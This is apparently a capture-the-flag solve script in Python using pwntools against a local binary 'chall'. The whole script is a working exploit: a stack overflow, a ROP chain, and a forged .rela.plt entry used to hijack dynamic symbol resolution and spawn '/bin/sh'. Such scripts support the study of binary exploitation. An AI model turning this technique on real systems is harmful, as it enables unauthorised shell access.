#!/usr/bin/env python3
from pwn import *

elf = ELF("./chall")
rop = ROP(elf)
target = process("./chall")

addr_plt_puts = elf.plt["puts"]
addr_plt_gets = elf.plt["gets"]
addr_plt_exit = elf.plt["exit"]
addr_got_gets = elf.got["gets"]
addr_bss = elf.bss()

addr_plt_start = elf.get_section_by_name(".plt").header.sh_addr
addr_rela_plt = elf.get_section_by_name(".rela.plt").header.sh_addr

addr_pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address 
addr_pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address 

stack_size = 0x800
base_stage = addr_bss + stack_size

# fake rela.plt
fake_rela_offset = (base_stage + 0x10) - addr_rela_plt
fake_rela_align = 0x18 - (fake_rela_offset % 0x18)
fake_rela_offset += fake_rela_align

fake_rela = p64(addr_got_gets)       # r_offset
fake_rela += p64(0x1 << 32 | 0x7)
fake_rela += p64(0x0)

puts_reloc_arg = fake_rela_offset // 0x18

print("[*] addr .plt start : 0x{:x}".format(addr_plt_start))
print("[*] addr .rela.plt start : 0x{:x}".format(addr_rela_plt))

print("[*] addr fake rela : 0x{:x}".format(base_stage + 0x10))

buf = b'A' * 0x78
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
buf += p64(addr_plt_gets)
buf += p64(addr_pop_rdi)
buf += p64(base_stage)
# buf += p64(addr_plt_puts)
buf += p64(addr_plt_start)
buf += p64(puts_reloc_arg)
buf += p64(addr_plt_exit)

_ = input()
target.sendline(buf)
target.sendline(b"/bin/sh\x00" + p64(0x0) + b"B" * fake_rela_align + fake_rela)

target.interactive()